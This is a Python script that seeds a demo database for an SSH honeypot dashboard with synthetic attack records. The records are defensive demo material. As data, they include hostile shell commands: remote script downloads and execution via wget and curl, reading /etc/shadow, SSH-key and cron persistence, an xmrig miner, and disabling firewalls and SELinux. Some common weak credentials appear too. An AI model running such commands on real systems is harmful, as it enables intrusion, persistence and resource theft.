"""Generate a large, realistic demo dataset for portfolio screenshots / video.

This is a DEMO-PREP TOOL ONLY — it does not change any application behaviour.
It inserts rows directly (matching the shape the pipeline would produce) so every
dashboard widget, chart, and report is fully populated without waiting for live
attacks or needing the GeoLite2 databases.

Usage (from project root):
    DATABASE_URL="sqlite:///data/sentinelssh.sqlite3" \
    .venv/bin/python scripts/seed_demo_large.py [--reset] [count]

  --reset   wipe existing attacks/commands/incidents first (recommended for a
            clean demo). Without it the script refuses to run on a non-empty DB.
  count     number of attacks to generate (default 550, minimum enforced 500).
"""
from __future__ import annotations

import json
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))
sys.path.insert(0, str(_ROOT / "backend"))

from core.db import init_db, session_scope  # noqa: E402
from core.models import Attack, Command, Incident  # noqa: E402
from core.models.incident import IncidentStatus  # noqa: E402

# --- Threat-source catalogue: realistic public IPs + GeoIP + ASN/ISP ---------
# (ip, country, asn, isp, malicious?)
_SOURCES = [
    ("185.220.100.5", "Russia", "AS205100", "FlokiNET", True),
    ("45.95.147.20", "Netherlands", "AS202425", "IP Volume inc", True),
    ("103.97.176.10", "China", "AS4837", "China Unicom", True),
    ("191.96.227.8", "Brazil", "AS262287", "Latitude.sh", True),
    ("196.196.150.3", "South Africa", "AS37153", "Xneelo", True),
    ("212.70.149.71", "Bulgaria", "AS9009", "M247", True),
    ("89.248.165.40", "Netherlands", "AS202425", "IP Volume inc", True),
    ("141.98.10.55", "Lithuania", "AS209605", "UAB Host Baltic", True),
    ("194.165.16.77", "Romania", "AS39798", "MivoCloud", True),
    ("218.92.0.112", "China", "AS4134", "Chinanet", True),
    ("61.177.172.19", "China", "AS4134", "Chinanet", True),
    ("159.223.44.90", "United States", "AS14061", "DigitalOcean", True),
    ("167.94.138.34", "United States", "AS398324", "Censys", False),
    ("92.118.39.88", "Germany", "AS51167", "Contabo", True),
    ("80.94.95.115", "Seychelles", "AS3223", "Voxility", True),
    ("193.32.162.45", "Moldova", "AS49877", "RM Engineering", True),
    ("45.227.254.8", "Panama", "AS59711", "HZ Hosting", True),
    ("23.94.122.66", "United States", "AS36352", "ColoCrossing", True),
    ("114.119.187.10", "Singapore", "AS136907", "Huawei Cloud", True),
    ("206.189.7.178", "India", "AS14061", "DigitalOcean", True),
    ("178.62.193.20", "United Kingdom", "AS14061", "DigitalOcean", True),
    ("49.88.112.74", "China", "AS4134", "Chinanet", True),
    ("171.25.193.78", "Sweden", "AS198093", "Foundation for Privacy", True),
    ("5.188.206.18", "Russia", "AS49505", "Selectel", True),
    ("147.182.131.99", "United States", "AS14061", "DigitalOcean", True),
    ("122.194.229.59", "China", "AS4837", "China Unicom", True),
    ("162.142.125.12", "United States", "AS398324", "Censys", False),
    ("104.248.45.30", "Canada", "AS14061", "DigitalOcean", True),
    ("190.103.179.55", "Argentina", "AS10481", "Prima S.A.", True),
    ("41.79.224.6", "Nigeria", "AS37340", "Cobranet", True),
]

_USERNAMES = ["root", "admin", "ubuntu", "postgres", "test", "oracle", "git",
              "pi", "user", "guest", "deploy", "ftpuser", "mysql", "tomcat",
              "administrator", "support", "service", "www-data"]
_PASSWORDS = ["123456", "admin", "password", "root", "12345678", "qwerty",
              "toor", "1234", "123456789", "P@ssw0rd", "letmein", "changeme",
              "admin123", "test", "pass123", "raspberry", "ubuntu", "oracle"]
_SSH_VERSIONS = ["SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-PUTTY_Release_0.70",
                 "SSH-2.0-paramiko_2.7.2", "SSH-2.0-OpenSSH_for_Windows_8.1",
                 "SSH-2.0-JSCH-0.1.54"]

# --- Attack profiles: (behaviors, mitre, command pool, (risk_lo, risk_hi)) ---
# Command tokens deliberately match core/intel/behavior.py regex rules so the
# MITRE classification stays internally consistent.
_PROFILES = [
    # weight 6 — noise: failed brute force, no shell
    (["brute_force"], ["T1110", "T1110.001"], [], (12, 28)),
    # weight 5 — common-credential brute force
    (["common_credential_use", "brute_force"], ["T1078", "T1110"], [], (30, 46)),
    # weight 4 — recon after access
    (["common_credential_use", "brute_force", "system_discovery", "user_discovery", "post_auth_activity"],
     ["T1078", "T1110", "T1082", "T1033", "T1021.004"],
     ["uname -a", "whoami", "id", "ls -la", "w", "ps aux", "cat /proc/cpuinfo"], (54, 70)),
    # weight 3 — account enumeration
    (["common_credential_use", "brute_force", "system_discovery", "account_discovery", "post_auth_activity"],
     ["T1078", "T1110", "T1082", "T1087", "T1021.004"],
     ["uname -a", "cat /etc/passwd", "cat /etc/shadow", "whoami", "ls -la /home"], (66, 82)),
    # weight 3 — payload delivery + execution
    (["common_credential_use", "brute_force", "tool_transfer", "script_execution", "post_auth_activity"],
     ["T1078", "T1110", "T1105", "T1059", "T1021.004"],
     ["wget http://45.95.147.20/x.sh", "chmod +x x.sh", "./x.sh", "curl -O http://185.220.100.5/bot", "sh install.sh"],
     (80, 92)),
    # weight 2 — persistence
    (["common_credential_use", "brute_force", "tool_transfer", "cron_persistence", "ssh_key_persistence", "post_auth_activity"],
     ["T1078", "T1110", "T1105", "T1053.003", "T1098.004", "T1021.004"],
     ["wget http://45.95.147.20/x.sh", "chmod +x x.sh", "./x.sh", "crontab -e",
      "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys", "crontab -l"], (85, 95)),
    # weight 2 — cryptomining (impact)
    (["common_credential_use", "brute_force", "tool_transfer", "cryptomining", "post_auth_activity"],
     ["T1078", "T1110", "T1105", "T1496", "T1021.004"],
     ["curl -O http://pool.minexmr.com/xmrig", "chmod +x xmrig",
      "./xmrig --donate-level 1 -o stratum+tcp://pool:3333", "nproc"], (90, 99)),
    # weight 1 — defense evasion + lateral discovery
    (["common_credential_use", "brute_force", "disable_defenses", "remote_discovery", "post_auth_activity"],
     ["T1078", "T1110", "T1562.001", "T1018", "T1021.004"],
     ["iptables -F", "ufw disable", "setenforce 0", "nmap -sn 10.0.0.0/24",
      "arp -a", "ping -c 3 10.0.0.1"], (88, 97)),
]
# Per-source behavioural tiers -> which profile indices that IP may exhibit.
# This produces a realistic SPREAD of incident severities (most sources are
# just scanners; a few are advanced intruders) instead of every incident being
# critical. (idx, weight) pairs into _PROFILES.
_TIERS = {
    "scanner":  [(0, 7), (1, 3)],                       # low / medium only
    "intruder": [(1, 2), (2, 4), (3, 3), (4, 2)],       # medium / high
    "advanced": [(2, 1), (4, 3), (5, 3), (6, 2), (7, 2)],  # high / critical
}
# Roughly 50% scanners, 30% intruders, 20% advanced.
_TIER_NAMES = (["scanner"] * 5) + (["intruder"] * 3) + (["advanced"] * 2)

# A few sources are "dormant" — all their activity is >4 days old, so their
# incidents close out (demonstrates the open -> triaged -> closed lifecycle).
_DORMANT_IPS = {"167.94.138.34", "190.103.179.55", "41.79.224.6", "23.94.122.66"}


def _risk_level(score: int) -> str:
    if score > 70:
        return "high"
    if score > 30:
        return "medium"
    return "low"


def _reset(session) -> None:
    # Children first to respect FKs.
    session.query(Command).delete()
    session.query(Attack).delete()
    session.query(Incident).delete()


def generate(count: int = 550, reset: bool = False) -> dict:
    count = max(count, 500)
    rng = random.Random(1337)  # deterministic for reproducible screenshots
    now = datetime.now(timezone.utc)
    stats = {"attacks": 0, "commands": 0, "incidents": 0}

    with session_scope() as session:
        if reset:
            _reset(session)
            session.flush()
        elif session.query(Attack).first() is not None:
            raise SystemExit(
                "database already has data — re-run with --reset to rebuild the demo set"
            )

        # One incident per source IP (gives us 25-30 incidents). Each source is
        # assigned a behavioural tier so incident severities vary realistically.
        incidents: dict[str, Incident] = {}
        tier_of: dict[str, str] = {}
        # Researcher/scanner orgs are always benign scanners regardless of slot.
        for idx, (ip, country, _asn, _isp, mal) in enumerate(_SOURCES):
            tier = "scanner" if not mal else _TIER_NAMES[idx % len(_TIER_NAMES)]
            tier_of[ip] = tier
            # Sentinels so min(first_seen, ts) / max(last_seen, ts) converge to
            # the real earliest/latest attack times during the loop.
            inc = Incident(
                source_ip=ip, country=country,
                first_seen=now + timedelta(days=3650),
                last_seen=now - timedelta(days=3650),
                attempt_count=0, max_risk_score=0, status=IncidentStatus.OPEN,
                mitre_techniques=json.dumps([]),
            )
            session.add(inc)
            incidents[ip] = inc
        session.flush()
        stats["incidents"] = len(incidents)

        for i in range(count):
            ip, country, asn, isp, malicious = rng.choice(_SOURCES)
            tier_choices = _TIERS[tier_of[ip]]
            prof_idx = rng.choices([c[0] for c in tier_choices],
                                   weights=[c[1] for c in tier_choices], k=1)[0]
            behaviors, mitre, cmd_pool, (lo, hi) = _PROFILES[prof_idx]
            behaviors = list(behaviors)
            mitre = list(mitre)
            if malicious:
                behaviors = behaviors + ["known_malicious_source"]

            risk = rng.randint(lo, hi)
            if ip in _DORMANT_IPS:
                # Dormant sources: all activity 4-10 days ago -> incident closes.
                ts = now - timedelta(minutes=rng.randint(4 * 24 * 60, 10 * 24 * 60))
            elif rng.random() < 0.65:
                # ~65% of remaining activity in the last 24h (busy chart).
                ts = now - timedelta(minutes=rng.randint(1, 24 * 60))
            else:
                ts = now - timedelta(minutes=rng.randint(24 * 60, 7 * 24 * 60))

            attempts = rng.randint(3, 40)
            inc = incidents[ip]
            inc.first_seen = min(inc.first_seen, ts)
            inc.last_seen = max(inc.last_seen, ts)
            inc.attempt_count += attempts
            inc.max_risk_score = max(inc.max_risk_score, risk)
            merged = list(dict.fromkeys(json.loads(inc.mitre_techniques or "[]") + mitre))
            inc.mitre_techniques = json.dumps(merged)

            attack = Attack(
                timestamp=ts, source_ip=ip, source_port=rng.randint(1024, 65535),
                country=country, asn=asn, isp=isp,
                reputation=rng.randint(85, 100) if malicious else rng.randint(0, 35),
                is_malicious=malicious,
                username=rng.choice(_USERNAMES), password=rng.choice(_PASSWORDS),
                ssh_version=rng.choice(_SSH_VERSIONS),
                session_id=f"sess{i:05d}{rng.randint(1000, 9999)}",
                duration=round(rng.uniform(0.3, 42.0), 2), auth_attempts=attempts,
                risk_score=risk, risk_level=_risk_level(risk),
                behaviors=json.dumps(behaviors), mitre_techniques=json.dumps(mitre),
                incident_id=inc.id,
            )

            # Attach a realistic command sequence for interactive sessions.
            if cmd_pool:
                k = min(len(cmd_pool), rng.randint(2, len(cmd_pool)))
                chosen = cmd_pool[:k]  # ordered (recon -> action) for realism
                for j, c in enumerate(chosen):
                    ctype = "exec" if (j == 0 and rng.random() < 0.15) else "shell"
                    attack.commands.append(Command(
                        session_id=attack.session_id,
                        timestamp=ts + timedelta(seconds=j + 1),
                        command=c, command_type=ctype,
                    ))
                    stats["commands"] += 1

            session.add(attack)
            stats["attacks"] += 1

        # Realistic incident lifecycle spread for the Incident Center.
        all_inc = list(incidents.values())
        for inc in all_inc:
            age_h = (now - inc.last_seen).total_seconds() / 3600.0
            inc.title = f"SSH activity from {inc.source_ip} ({inc.country}) — {inc.attempt_count} attempts"
            if age_h > 96:
                inc.status = IncidentStatus.CLOSED
            elif inc.max_risk_score >= 85 and age_h < 24:
                inc.status = IncidentStatus.OPEN
            else:
                inc.status = rng.choice([IncidentStatus.OPEN, IncidentStatus.TRIAGED])

    return stats


def main() -> None:
    reset = "--reset" in sys.argv
    nums = [a for a in sys.argv[1:] if a.isdigit()]
    count = int(nums[0]) if nums else 550
    init_db()
    stats = generate(count=count, reset=reset)
    print(
        f"seeded {stats['attacks']} attacks, {stats['commands']} commands, "
        f"{stats['incidents']} incidents"
    )


if __name__ == "__main__":
    main()
